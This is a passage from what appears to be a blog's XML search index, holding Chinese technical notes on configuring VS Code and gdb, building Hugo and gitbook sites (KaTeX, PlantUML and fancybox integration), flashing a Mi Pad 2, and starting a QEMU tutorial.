class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Set Disassembly Flavor to Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-执行gdb命令"><a href="#1-2-执行gdb命令" class="headerlink" title="1.2. 执行gdb命令"></a>1.2. 执行gdb命令</h3><ul>
<li>启动gdb后，在<code>Debug Console</code>执行<code>-exec xxx</code>即可，<code>-exec</code>后面跟gdb命令</li>
</ul>
<h1 id="六、配置-settings-json"><a href="#六、配置-settings-json" class="headerlink" title="六、配置 settings.json"></a>六、配置 settings.json</h1><h2 id="1-禁用git"><a href="#1-禁用git" class="headerlink" title="1. 禁用git"></a>1. 禁用git</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;git.enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="七、基本使用的一些操作"><a href="#七、基本使用的一些操作" class="headerlink" title="七、基本使用的一些操作"></a>七、基本使用的一些操作</h1><h2 id="1-高级替换"><a href="#1-高级替换" class="headerlink" title="1. 高级替换"></a>1. 高级替换</h2><ul>
<li>使用<code>()</code>圈起来的正则在替换时按顺序变成<code>$n</code></li>
<li>需要开启正则匹配</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ul>
<li>查找<code>abc(.*)=(.*)def</code></li>
<li>替换<code>abc$2=$1def</code></li>
</ul>
<p>效果将<code>abc!@#=*()def</code>替换成<code>abc*()=!@#def</code></p>
<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-在ubuntu上使用管理员打开vscode"><a href="#1-在ubuntu上使用管理员打开vscode" class="headerlink" title="1. 在ubuntu上使用管理员打开vscode"></a>1. 在ubuntu上使用管理员打开vscode</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo code --user-data-dir=&quot;/path/to/.vscode-root&quot; --no-sandbox --disable-gpu-sandbox</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Software Usage</category>
      </categories>
  </entry>
  <entry>
    <title>hugo搭建笔记</title>
    <url>/blogs/2022-02-14-hugo/</url>
    <content><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><h2 id="1-首先安装golang"><a href="#1-首先安装golang" class="headerlink" title="1. 首先安装golang"></a>1. 首先安装golang</h2><h2 id="2-安装hugo"><a href="#2-安装hugo" class="headerlink" title="2. 安装hugo"></a>2. 安装hugo</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">标准版</span></span><br><span class="line">go install github.com/gohugoio/hugo@latest</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扩展版</span></span><br><span class="line">CGO_ENABLED=1 go install -tags extended github.com/gohugoio/hugo@latest</span><br></pre></td></tr></table></figure>

<h2 id="3-将-GOPATH-bin加到PATH中"><a href="#3-将-GOPATH-bin加到PATH中" class="headerlink" title="3. 将$GOPATH/bin加到PATH中"></a>3. 将<code>$GOPATH/bin</code>加到PATH中</h2><h1 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h1><h2 id="1-初始化工程"><a href="#1-初始化工程" class="headerlink" title="1. 初始化工程"></a>1. 初始化工程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--force 在非空目录创建</span></span><br><span class="line">hugo new site /path/to/site</span><br></pre></td></tr></table></figure>

<h2 id="2-安装皮肤"><a href="#2-安装皮肤" class="headerlink" title="2. 安装皮肤"></a>2. 安装皮肤</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule add https://github.com/alex-shpak/hugo-book themes/book</span><br></pre></td></tr></table></figure>

<h3 id="2-1-类似gitbook的主题-hugo-book"><a href="#2-1-类似gitbook的主题-hugo-book" class="headerlink" title="2.1. 类似gitbook的主题 hugo-book"></a>2.1. 类似gitbook的主题 hugo-book</h3><p><a href="https://github.com/alex-shpak/hugo-book">https://github.com/alex-shpak/hugo-book</a></p>
<ul>
<li>使用时先将exampleSite里面内容拷贝到项目根目录</li>
<li>剩下的自己diy吧</li>
</ul>
<h2 id="3-本地调试"><a href="#3-本地调试" class="headerlink" title="3. 本地调试"></a>3. 本地调试</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> --disableFastRender 重新生成页面，不使用缓存</span></span><br><span class="line">hugo server --theme book --disableFastRender</span><br></pre></td></tr></table></figure>

<h2 id="4-生成静态页面"><a href="#4-生成静态页面" class="headerlink" title="4. 生成静态页面"></a>4. 生成静态页面</h2><ul>
<li>直接执行，会生成在工程目录的<code>public</code>下面</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> --cleanDestinationDir 重新生成页面，清空目录</span></span><br><span class="line">hugo --cleanDestinationDir</span><br></pre></td></tr></table></figure>

<h1 id="三、个性化配置"><a href="#三、个性化配置" class="headerlink" title="三、个性化配置"></a>三、个性化配置</h1><h2 id="1-页面内跳转"><a href="#1-页面内跳转" class="headerlink" title="1. 页面内跳转"></a>1. 页面内跳转</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前配置</span></span><br><span class="line">=&gt; hugo config | grep -i relative</span><br><span class="line">relativeurls: true</span><br></pre></td></tr></table></figure>

<h3 id="1-1-使用相对路径"><a href="#1-1-使用相对路径" class="headerlink" title="1.1. 使用相对路径"></a>1.1. 使用相对路径</h3><ul>
<li>需要在<code>config.yaml</code>添加<code>relativeurls: true</code></li>
<li><strong><font color="red">使用<code>hugo server</code>是不会生效的，但是使用<code>hugo</code>生成的页面会生效</font></strong></li>
</ul>
<h3 id="1-2-使用绝对路径"><a href="#1-2-使用绝对路径" class="headerlink" title="1.2. 使用绝对路径"></a>1.2. 使用绝对路径</h3><ul>
<li>同上，设置<code>relativeurls: false</code></li>
<li>并且要设置<code>baseURL: https://githubwyb.github.io/</code></li>
<li>重新生成即可</li>
</ul>
<h2 id="2-latex支持"><a href="#2-latex支持" class="headerlink" title="2. latex支持"></a>2. latex支持</h2><ul>
<li>使用katex进行latex支持</li>
<li>先下载<code>https://github.com/KaTeX/KaTeX/releases</code></li>
<li>解压后拷贝<code>katex</code>到项目的<code>static/lib/katex</code>中</li>
<li>拷贝主题里面的<code>layouts/partials/docs/html-head.html</code>到项目根目录的<code>layouts/partials/docs/html-head.html</code></li>
<li>在模板文件<code>html-head.html</code>中添加以下代码，同样实现了行内的解析</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/lib/katex/katex.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/lib/katex/katex.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/lib/katex/contrib/auto-render.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">renderMathInElement</span>(<span class="variable language_">document</span>.<span class="property">body</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">delimiters</span>: [</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">left</span>: <span class="string">&quot;$$&quot;</span>, <span class="attr">right</span>: <span class="string">&quot;$$&quot;</span>, <span class="attr">display</span>: <span class="literal">true</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">left</span>: <span class="string">&quot;$&quot;</span>, <span class="attr">right</span>: <span class="string">&quot;$&quot;</span>, <span class="attr">display</span>: <span class="literal">false</span> &#125;</span></span><br><span class="line"><span class="language-javascript">      ]</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<p>想要使用换行，需要使用<code>\\\\</code>换行，使用<code>\\</code>不行</p>
<h2 id="3-添加静态文件"><a href="#3-添加静态文件" class="headerlink" title="3. 添加静态文件"></a>3. 添加静态文件</h2><p>将文件放到static目录下面就可以直接添加到生成的文件里面</p>
<h2 id="4-plantuml支持"><a href="#4-plantuml支持" class="headerlink" title="4. plantuml支持"></a>4. plantuml支持</h2><p>参考 <a href="https://mogeko.me/posts/zh-cn/083/">在hugo博客里面使用plantuml</a></p>
<ul>
<li>加快速度就下载<code>https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js</code></li>
<li>放到<code>/static/lib</code>下面</li>
<li>拷贝主题里面的<code>layouts/partials/docs/html-head.html</code>到项目根目录的<code>layouts/partials/docs/html-head.html</code></li>
<li>将下面的代码放到<code>html-head.html</code>里面</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; if or .Page.Params.plantuml .Site.Params.plantuml &#125;&#125;</span><br><span class="line"><span class="comment">&lt;!-- PlantUML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/lib/plantuml-encoder.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> plantumlPrefix = <span class="string">&quot;language-plantuml&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>.<span class="title function_">call</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;[class^=&quot;</span> + plantumlPrefix + <span class="string">&quot;]&quot;</span>), <span class="keyword">function</span>(<span class="params">code</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> image = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;IMG&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    image.<span class="property">loading</span> = <span class="string">&#x27;lazy&#x27;</span>; <span class="comment">// Lazy loading</span></span></span><br><span class="line"><span class="language-javascript">    image.<span class="property">src</span> = <span class="string">&#x27;http://www.plantuml.com/plantuml/svg/~1&#x27;</span> + plantumlEncoder.<span class="title function_">encode</span>(code.<span class="property">innerText</span>);</span></span><br><span class="line"><span class="language-javascript">    code.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    code.<span class="property">parentNode</span>.<span class="property">style</span> = <span class="string">&#x27;text-align: center; margin: 0; padding: 0; background-color: transparent;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#123;&#123; <span class="keyword">if</span> .<span class="property">Page</span>.<span class="property">Site</span>.<span class="property">Params</span>.<span class="property">fancybox</span> &#125;&#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 对图片添加fancybox</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;DIV&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    div.<span class="property">className</span> = <span class="string">&quot;post-img-view&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;A&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    a.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-fancybox&quot;</span>, <span class="string">&quot;gallery&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    a.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, image.<span class="property">src</span>);</span></span><br><span class="line"><span class="language-javascript">    a.<span class="title function_">appendChild</span>(image);</span></span><br><span class="line"><span class="language-javascript">    div.<span class="title function_">appendChild</span>(a);</span></span><br><span class="line"><span class="language-javascript">    code.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(div, code);</span></span><br><span class="line"><span class="language-javascript">    &#123;&#123; <span class="keyword">else</span> &#125;&#125;</span></span><br><span class="line"><span class="language-javascript">    code.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(image, code);</span></span><br><span class="line"><span class="language-javascript">    &#123;&#123; end &#125;&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;&#123; end &#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>全局开启就在配置<code>config.yaml</code>中添加</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="attr">plantuml:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>单个页面开启就在页面头部添加</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">plantuml:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="5-fancybox-图片添加放大效果"><a href="#5-fancybox-图片添加放大效果" class="headerlink" title="5. fancybox 图片添加放大效果"></a>5. fancybox 图片添加放大效果</h2><p>参考 <a href="https://www.zatp.com/post/hugo-fancybox/?replyTo=96">Hugo 使用 Fancybox 实现图片灯箱&#x2F;放大功能</a></p>
<ol>
<li>下载下面几个文件，放到<code>/static/lib/fancybox</code>下面</li>
</ol>
<ul>
<li><code>https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js</code></li>
<li><code>https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css</code></li>
<li><code>https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js</code></li>
</ul>
<ol start="2">
<li>复制一份<code>themes/book/layouts/_default/_markup/render-image.html</code>到<code>layouts/_default/_markup/render-image.html</code></li>
<li>编辑<code>layouts/_default/_markup/render-image.html</code></li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 找到下面一段 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; .Destination | safeURL &#125;&#125;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&#123;&#123; .Text &#125;&#125;&quot;</span> &#123;&#123; <span class="attr">with</span> <span class="attr">.Title</span> &#125;&#125;<span class="attr">title</span>=<span class="string">&quot;&#123;&#123; . &#125;&#125;&quot;</span>&#123;&#123; <span class="attr">end</span> &#125;&#125;/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 修改为 --&gt;</span></span><br><span class="line">&#123;&#123;- if .Page.Site.Params.fancybox &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;post-img-view&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">data-fancybox</span>=<span class="string">&quot;gallery&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; .Destination | safeURL &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; .Destination | safeURL &#125;&#125;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&#123;&#123; .Text &#125;&#125;&quot;</span> &#123;&#123; <span class="attr">with</span> <span class="attr">.Title</span>&#125;&#125; <span class="attr">title</span>=<span class="string">&quot;&#123;&#123; . &#125;&#125;&quot;</span>&#123;&#123; <span class="attr">end</span> &#125;&#125; /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;- else &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; .Destination | safeURL &#125;&#125;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&#123;&#123; .Text &#125;&#125;&quot;</span> &#123;&#123; <span class="attr">with</span> <span class="attr">.Title</span> &#125;&#125;<span class="attr">title</span>=<span class="string">&quot;&#123;&#123; . &#125;&#125;&quot;</span>&#123;&#123; <span class="attr">end</span> &#125;&#125;/&gt;</span></span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>复制一份<code>themes/book/layouts/partials/docs/html-head.html</code>到<code>layouts/partials/docs/html-head.html</code></li>
<li>编辑<code>layouts/partials/docs/html-head.html</code>，末尾追加</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123;if .Page.Site.Params.fancybox &#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/lib/fancybox/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/lib/fancybox/jquery.fancybox.min.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/lib/fancybox/jquery.fancybox.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;&#123; end &#125;&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>markdown中引入图片需要使用<code>![](imgs/1.png)</code>，使用img标签不支持</li>
<li>重新生成看效果</li>
</ol>
<h2 id="6-代码块格式"><a href="#6-代码块格式" class="headerlink" title="6. 代码块格式"></a>6. 代码块格式</h2><ul>
<li>配置如下<code>config.yaml</code></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Needed for mermaid/katex shortcodes</span></span><br><span class="line"><span class="attr">markup:</span></span><br><span class="line">  <span class="attr">highlight:</span></span><br><span class="line">    <span class="comment"># lineAnchors: &quot;&quot;</span></span><br><span class="line">    <span class="comment"># anchorLineNos: false</span></span><br><span class="line">    <span class="attr">codeFences:</span> <span class="literal">false</span>         <span class="comment"># 是否使用代码围栏，默认true，不使用将没有行号高亮等风格</span></span><br><span class="line">    <span class="attr">guessSyntax:</span> <span class="literal">false</span>        <span class="comment"># 不标识代码类型，不自动猜测，默认true</span></span><br><span class="line">    <span class="comment"># hl_Lines: &quot;&quot;            # 高亮的行号，一般不设置，每个块应该都不一样，不需要统一</span></span><br><span class="line">    <span class="attr">lineNoStart:</span> <span class="number">1</span>            <span class="comment"># 行号开始于1，默认1</span></span><br><span class="line">    <span class="attr">lineNos:</span> <span class="literal">true</span>             <span class="comment"># 是否显示行号，默认false</span></span><br><span class="line">    <span class="attr">lineNumbersInTable:</span> <span class="literal">false</span> <span class="comment"># 是否以表格&lt;tr&gt;的形式展示行号，false使用&lt;span&gt;，表格方式行号好像有问题，默认true</span></span><br><span class="line">    <span class="comment"># noClasses: true</span></span><br><span class="line">    <span class="comment"># noHl: false</span></span><br><span class="line">    <span class="attr">style:</span> <span class="string">dracula</span>            <span class="comment"># 代码高亮主题，参考 https://xyproto.github.io/splash/docs/all.html</span></span><br><span class="line">    <span class="attr">tabWidth:</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="7-右侧文章大纲配置"><a href="#7-右侧文章大纲配置" class="headerlink" title="7. 右侧文章大纲配置"></a>7. 右侧文章大纲配置</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Needed for mermaid/katex shortcodes</span></span><br><span class="line"><span class="attr">markup:</span></span><br><span class="line">  <span class="attr">tableOfContents:</span></span><br><span class="line">    <span class="attr">ordered:</span> <span class="literal">false</span>    <span class="comment"># 是否添加序号，默认false</span></span><br><span class="line">    <span class="attr">startLevel:</span> <span class="number">1</span>     <span class="comment"># 展示的开始级别，默认1</span></span><br><span class="line">    <span class="comment"># endLevel: 3     # 结束级别，默认3</span></span><br></pre></td></tr></table></figure>

<h1 id="四、主题配置"><a href="#四、主题配置" class="headerlink" title="四、主题配置"></a>四、主题配置</h1><h2 id="1-hugo-book"><a href="#1-hugo-book" class="headerlink" title="1. hugo-book"></a>1. hugo-book</h2><h3 id="1-1-目录树"><a href="#1-1-目录树" class="headerlink" title="1.1. 目录树"></a>1.1. 目录树</h3><ul>
<li>需要目录下存在<code>_index.md</code>才会呈现树状，否则就是平铺</li>
<li><code>_index.md</code>头部配置</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="section"># Set type to &#x27;docs&#x27; if you want to render page outside of configured section or if you render section other than &#x27;docs&#x27;</span></span><br><span class="line">type: &#x27;docs&#x27;</span><br><span class="line"><span class="section"># Set page weight to re-arrange items in file-tree menu (if BookMenuBundle not set)</span></span><br><span class="line">weight: 1</span><br><span class="line"><span class="section"># true就是不和同级的文档在一起，单独形成一个节点，虽然属于父级可折叠，但是展开后和父级效果一样</span></span><br><span class="line">bookFlatSection: true</span><br><span class="line"><span class="section"># 此目录是否可以折叠，右边是否显示三角</span></span><br><span class="line">bookCollapseSection: true</span><br><span class="line"><span class="section"># (Optional) Set true to hide page or section from side menu (if BookMenuBundle not set)</span></span><br><span class="line">bookHidden: false</span><br><span class="line"><span class="section"># (Optional) Set &#x27;false&#x27; to hide ToC from page</span></span><br><span class="line">bookToC: true</span><br><span class="line"><span class="section"># (Optional) If you have enabled BookComments for the site, you can disable it for specific pages.</span></span><br><span class="line">bookComments: true</span><br><span class="line"><span class="section"># (Optional) Set to &#x27;false&#x27; to exclude page from search index.</span></span><br><span class="line">bookSearchExclude: true</span><br><span class="line"><span class="section"># (Optional) Set explicit href attribute for this page in a menu (if BookMenuBundle not set)</span></span><br><span class="line"><span class="section">bookHref: &#x27;&#x27;</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-hugo内嵌html代码"><a href="#1-hugo内嵌html代码" class="headerlink" title="1. hugo内嵌html代码"></a>1. hugo内嵌html代码</h2><ul>
<li><code>config.yaml</code>中配置</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">markup:</span></span><br><span class="line">  <span class="attr">goldmark:</span></span><br><span class="line">    <span class="attr">renderer:</span></span><br><span class="line">      <span class="attr">unsafe:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>gitbook搭建笔记</title>
    <url>/blogs/2022-02-14-gitbook/</url>
    <content><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><ul>
<li>gitbook支持的nodejs版本是<code>v10.x</code>使用高版本会报错</li>
</ul>
<h2 id="1-首先安装node和npm"><a href="#1-首先安装node和npm" class="headerlink" title="1. 首先安装node和npm"></a>1. 首先安装node和npm</h2><h2 id="2-安装gitbook-cli"><a href="#2-安装gitbook-cli" class="headerlink" title="2. 安装gitbook-cli"></a>2. 安装gitbook-cli</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install gitbook-cli -g</span><br></pre></td></tr></table></figure>

<h1 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h1><h2 id="1-初始化工程"><a href="#1-初始化工程" class="headerlink" title="1. 初始化工程"></a>1. 初始化工程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitbook init</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>小米平板2刷机记录</title>
    <url>/blogs/2022-01-23-mipad2/</url>
    <content><![CDATA[<h1 id="一、刷MIUI"><a href="#一、刷MIUI" class="headerlink" title="一、刷MIUI"></a>一、刷MIUI</h1><h2 id="1-线刷失败解决"><a href="#1-线刷失败解决" class="headerlink" title="1. 线刷失败解决"></a>1. 线刷失败解决</h2><ul>
<li>从win10到miui直接线刷会提示<code>flash failed: not found</code>之类的错误</li>
<li>需要先刷到原生android系统，再进行线刷</li>
</ul>
<h2 id="2-驱动适配"><a href="#2-驱动适配" class="headerlink" title="2. 驱动适配"></a>2. 驱动适配</h2><ul>
<li>驱动官方下载地址: <a href="https://androidmtk.com/download-intel-android-usb-driver">intel android AD</a></li>
<li>win11不兼容<code>intel android AD</code>驱动</li>
<li>使用win7安装intel的<code>intel android AD</code>驱动</li>
<li>在设备管理器，找到未识别的设备，然后更新驱动，使用本地<code>intel android ad</code>安装的目录即可</li>
</ul>
<h1 id="二、刷win10"><a href="#二、刷win10" class="headerlink" title="二、刷win10"></a>二、刷win10</h1><h1 id="三、miui技巧"><a href="#三、miui技巧" class="headerlink" title="三、miui技巧"></a>三、miui技巧</h1><h2 id="1-蓝牙键盘"><a href="#1-蓝牙键盘" class="headerlink" title="1. 蓝牙键盘"></a>1. 蓝牙键盘</h2><ul>
<li>谷歌键盘比较好的适配<code>esc</code>、中英文切换以及键盘弹出</li>
<li>但是谷歌输入法无法输入反引号，需要设置字典，将反引号设置成输入拼音联想到反引号</li>
</ul>
<h2 id="2-chrome-for-android-x86"><a href="#2-chrome-for-android-x86" class="headerlink" title="2. chrome for android x86"></a>2. chrome for android x86</h2><ul>
<li>chrome可以使用websocket</li>
<li>最高可以使用95版本的chrome</li>
<li>chrome配置默认桌面版，需要设置<code>chrome://flags</code>，开启<code>Request desktop site for tablets on Android</code>，设置成<code>Enabled for 100dp+ screens</code></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>qemu命令详解</title>
    <url>/blogs/2022-01-20-qemu/</url>
    <content><![CDATA[<h1 id="一、qemu介绍"><a href="#一、qemu介绍" class="headerlink" title="一、qemu介绍"></a>一、qemu介绍</h1><ul>
<li>QEMU模拟器主要有两种比较常见的运作模式：User Mode（使用者模式）、System Mode（系统模式）。</li>
<li>User Mode模式下，用户只需要将各种不同平台的处理编译得到的Linux程序放在QEMU虚拟中运行即可，其他的事情全部由QEMU虚拟机来完成，不需要用户自定义内核和虚拟磁盘等文件；</li>
<li>System Mode模式下，最明显的特点是用户可以为QEMU虚拟机指定运行的内核或者虚拟硬盘等文件，简单来说系统模式下QEMU虚拟机是可根据用户的要求配置的。</li>
</ul>
<h1 id="二、系统模式"><a href="#二、系统模式" class="headerlink" title="二、系统模式"></a>二、系统模式</h1><h2 id="1-实战使用qemu安装启动aarch64的archlinux"><a href="#1-实战使用qemu安装启动aarch64的archlinux" class="headerlink" title="1. 实战使用qemu安装启动aarch64的archlinux"></a>1. 实战使用qemu安装启动aarch64的archlinux</h2><h3 id="1-1-创建虚拟磁盘镜像"><a href="#1-1-创建虚拟磁盘镜像" class="headerlink" title="1.1. 创建虚拟磁盘镜像"></a>1.1. 创建虚拟磁盘镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img create archlinux-aarch64.img 30G</span><br></pre></td></tr></table></figure>

